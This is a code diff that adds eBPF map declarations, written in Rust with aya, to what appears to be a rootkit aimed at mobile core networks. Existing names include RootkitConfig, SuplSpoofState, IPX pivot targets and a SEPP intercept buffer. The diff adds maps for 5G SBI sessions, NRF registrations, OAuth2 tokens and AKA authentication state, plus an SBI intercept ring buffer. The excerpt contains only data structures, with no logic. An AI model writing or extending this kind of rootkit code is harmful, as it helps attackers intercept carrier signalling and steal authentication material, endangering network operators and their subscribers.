@@ -3,8 +3,9 @@ use aya_ebpf::{
     maps::{HashMap, RingBuf},
 };
 use common::{
-    CellInfo, EsimProvisionCtx, FemtocellCtx, GtpTunnelState, ImsSipSession, LiInterfaceState,
-    NetworkSliceInfo, RoamingState, RootkitConfig, RtpStreamState, SignalingState, SuplSpoofState,
+    AkaAuthState, CellInfo, EsimProvisionCtx, FemtocellCtx, GtpTunnelState, HandoverCtx,
+    ImsSipSession, LiInterfaceState, MimoBeamState, NetworkSliceInfo, NrfRegistration, RoamingState,
+    RootkitConfig, RtpStreamState, SbiSessionState, SidelinkCtx, SignalingState, SuplSpoofState,
     VoWiFiTunnelState,
 };
 
@@ -121,3 +122,35 @@ pub(crate) static IPX_PIVOT_TARGETS: HashMap<u32, u32> = HashMap::with_max_entri
 
 #[map]
 pub(crate) static SEPP_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);
+
+// ──────────────────────────────────────────────
+// Category 7: 5G Advanced / RAN / SBI Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static SBI_SESSIONS: HashMap<u64, SbiSessionState> = HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static NRF_REGISTRATIONS: HashMap<u64, NrfRegistration> =
+    HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static OAUTH2_TOKENS: HashMap<u64, u64> = HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static AKA_AUTH_STATE: HashMap<u64, AkaAuthState> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static SIDELINK_SESSIONS: HashMap<u32, SidelinkCtx> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static HANDOVER_CTX: HashMap<u32, HandoverCtx> = HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static MIMO_BEAMS: HashMap<u32, MimoBeamState> = HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static NEIGHBOR_CELLS: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static SBI_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);
